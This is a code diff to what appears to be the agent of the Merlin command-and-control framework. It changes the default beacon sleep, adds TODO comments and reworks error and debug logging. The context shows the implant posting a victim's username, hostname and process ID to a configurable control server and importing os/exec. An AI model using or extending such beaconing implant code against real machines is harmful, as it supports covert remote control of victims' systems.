@@ -13,7 +13,7 @@ import (
 	"github.com/satori/go.uuid"
 	"golang.org/x/net/http2"
 	"os/exec"
-	"../standard/messages"
+	"../messages" // TODO Needs to be replaced with github.com/Neond0g/merlin/pkg/messages
 	"flag"
 	"runtime"
 	"strings"
@@ -35,7 +35,7 @@ func main() {
 	flag.BoolVar(&VERBOSE, "v", false, "Enable verbose output")
 	flag.BoolVar(&DEBUG, "debug", false, "Enable debug output")
 	flag.StringVar(&url, "url", "https://127.0.0.1:443", "Full URL for agent to connect to")
-	flag.DurationVar(&waitTime, "sleep", 10000 * time.Millisecond, "Time for agent to sleep")
+	flag.DurationVar(&waitTime, "sleep", 30000 * time.Millisecond, "Time for agent to sleep")
 	flag.Usage = usage
 	flag.Parse()
 
@@ -79,7 +79,7 @@ func initialCheckIn(host string, client *http.Client) {
 		UserName: u.Username,
 		UserGUID: u.Gid,
 		HostName: h,
-		Pid: os.Getpid(),
+		Pid: os.Getpid(), // TODO get and return IP addresses
 	}
 
 	payload, _ := json.Marshal(i)
@@ -133,16 +133,18 @@ func statusCheckIn(host string, client *http.Client) {
 
 	resp, err := client.Post(host, "application/json; charset=utf-8", b)
 
-	if err != nil && DEBUG {
-		color.Red("[!]There was an error with the HTTP Response")
-		fmt.Println(err)
+	if err != nil {
+		if VERBOSE{
+			color.Red("[!]There was an error with the HTTP Response:")
+			color.Red(err.Error()) //On Mac I get "read: connection reset by peer" here but not on other platforms
+		}			      //Only does this with a 10s Sleep
 		return
 	}
 
 	if DEBUG {
 		color.Red("%s", "[DEBUG]HTTP Response:")
-		color.Red("ContentLength: %s", resp.ContentLength)
-		color.Red("%s", resp)
+		color.Red("[DEBUG]ContentLength: %d", resp.ContentLength)
+		color.Red("[DEBUG]%s", resp)
 	}
 
 	if resp.ContentLength > 0 {
